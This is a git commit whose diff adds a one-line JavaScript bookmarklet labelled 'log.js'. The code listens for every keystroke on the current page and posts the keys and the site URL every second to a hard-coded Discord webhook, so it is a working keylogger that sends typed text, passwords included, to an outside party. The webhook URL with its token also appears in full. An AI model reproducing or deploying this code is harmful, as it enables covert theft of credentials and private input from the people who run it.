29399b77d8c922e8332914c1eb33d903f8f76bba
7Frost7 <Frost.17@tuta.io>
2024-09-25 10:03:47 -0700

    Update and rename code.js to code(delay).js

---
+++ code(delay).js
@@ -0,0 +1,3 @@
+/// log.js
+javascript:(function(){let log=[],siteURL=window.location.href;setTimeout(function(){fetch('https://discord.com/api/webhooks/1288242859765665923/NnERv8pZZ-bsQYDbhTWWtmpjB2qsqbRW4sr_Ub70o2rFz1zUD_wwTU2QAI4k1emhwjSp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`Current Site URL: ${siteURL}`})});},1500);document.addEventListener('keydown',function(event){log.push('Key pressed: '+event.key);});setInterval(function(){if(log.length>0){fetch('https://discord.com/api/webhooks/1288242859765665923/NnERv8pZZ-bsQYDbhTWWtmpjB2qsqbRW4sr_Ub70o2rFz1zUD_wwTU2QAI4k1emhwjSp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:log.join('\n')})});log=[];}},1000);})();
+
